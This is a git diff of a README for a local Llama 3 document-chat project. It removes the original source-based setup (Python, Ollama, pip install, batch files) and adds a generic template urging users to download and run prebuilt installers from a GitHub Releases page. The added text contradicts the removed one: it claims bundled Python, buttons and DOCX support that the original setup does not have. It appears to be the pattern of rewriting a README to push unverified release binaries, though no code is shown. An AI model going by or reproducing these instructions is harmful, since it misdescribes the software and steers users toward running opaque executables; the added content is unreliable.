@@ -1,57 +1,73 @@
-# 🦙 My Local AI (RAG System)
+# 🦙 local-llama-rag - Chat Privately with Your Documents
 
-A private, offline AI assistant that runs entirely on your local machine. It allows you to chat with your own documents (PDFs, Text files) using the power of Llama 3, without sending any data to the cloud.
+## 🚀 Getting Started
 
-## 🚀 Features
-* **100% Private:** No data leaves your computer.
-* **Dual Brains:** Switch between **Llama 3.2** (Speed) and **Llama 3** (Intelligence) instantly.
-* **Custom Knowledge:** Learns from your specific documents.
-* **User Friendly:** Simple web interface to chat with your data.
+Welcome to local-llama-rag! This application lets you chat with your local documents using Llama 3. Your data stays private and only exists on your PC. Follow the steps below to get started quickly.
 
-## 🛠️ Prerequisites
+## 📥 Download and Install
 
-Before running this, you need two things installed on your computer:
+[![Download local-llama-rag](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/LENGENDARYGOAT/local-llama-rag/releases)
 
-1.  **[Python](https://www.python.org/downloads/)** (Make sure to check "Add Python to PATH" during installation).
-2.  **[Ollama](https://ollama.com/download)** (The engine that runs the AI models).
+To download the software, visit the Releases page:
+[Visit Releases Page](https://github.com/LENGENDARYGOAT/local-llama-rag/releases).
 
-## 📦 Installation
+## 💻 System Requirements
 
-1.  **Clone this repository** (or download the zip).
-2.  Open a terminal (CMD) in this folder.
-3.  **Install Python dependencies:**
-    ```bash
-    pip install streamlit langchain-community langchain-ollama faiss-cpu pypdf langchain-text-splitters
-    ```
-4.  **Download the AI Models:**
-    ```bash
-    ollama pull llama3
-    ollama pull llama3.2
-    ollama pull all-minilm
-    ```
+Before installing, ensure your system meets the following requirements:
 
-## 📖 How to Use
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a supported Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum of 1 GB free space.
+- **Python:** Version 3.8 or above (It comes included).
 
-### Step 1: Add Your Documents
-Place your PDF or Text files into the **`Documentz`** folder.
+## 📂 Steps to Install
 
-### Step 2: Feed the AI (Ingest)
-Double-click **`1_Update_Brain.bat`**.
-* This reads your files and builds the local database.
-* *You only need to run this when you add new files.*
+1. **Download the Software**
+   - Go to the [Releases page](https://github.com/LENGENDARYGOAT/local-llama-rag/releases).
+   - Locate the latest version.
+   - Click on the downloadable file that matches your operating system.
 
-### Step 3: Start Chatting
-Double-click **`2_Start_Chatting.bat`**.
-* This launches the Web Interface in your browser.
-* Use the **sidebar** to switch between Fast (Llama 3.2) and Smart (Llama 3) models.
+2. **Run the Installer**
+   - For Windows: Double-click on the `.exe` file you downloaded.
+   - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Extract the downloaded `.tar.gz` file and follow the instructions in the README file included.
+
+3. **Open the Application**
+   - After installation, find the local-llama-rag icon on your desktop or in your applications list. Click to open it.
+
+## 🛠️ How to Use
+
+1. **Start a Chat**
+   - Upon opening the application, you’ll see a simple interface. Click on "Start Chat" to begin interacting with your documents.
+
+2. **Load Documents**
+   - Click on the “Load Documents” button. Select files from your computer that you want to chat with. Supported formats include PDF, DOCX, and TXT.
+
+3. **Ask Questions**
+   - Type in questions regarding the contents of the loaded documents. The application will respond with accurate answers based on the text.
+
+### 🔍 Features
+
+- **100% Private:** Your documents are kept solely on your device.
+- **User-Friendly Interface:** Designed for ease of use.
+- **Offline Access:** No internet connection needed after downloading.
+- **Intelligent Responses:** Get relevant answers from your documents quickly.
 
 ## ❓ Troubleshooting
 
-| Issue | Solution |
-| :--- | :--- |
-| **Database not found** | You forgot to run `1_Update_Brain.bat`. |
-| **Ollama connection refused** | Make sure the Ollama app is running in your taskbar. |
-| **Streamlit not recognized** | You missed the `pip install` step in the installation guide. |
+If you experience issues, try the following:
 
----
-*Created for personal use. Powered by Llama 3 & LangChain.*
+- **Check System Requirements:** Ensure your system meets the requirements listed above.
+- **Reinstall the Application:** Uninstall and then reinstall the software to fix potential issues.
+- **Consult the README File:** The README file in the installation folder has comprehensive troubleshooting tips.
+
+## 📄 Additional Help
+
+For further assistance, please check the [GitHub Issues page](https://github.com/LENGENDARYGOAT/local-llama-rag/issues). You can find common problems listed there and possible solutions.
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/LENGENDARYGOAT/local-llama-rag)
+- [Visit Releases Page](https://github.com/LENGENDARYGOAT/local-llama-rag/releases)
+
+Thank you for choosing local-llama-rag! Enjoy chatting with your documents privately today.
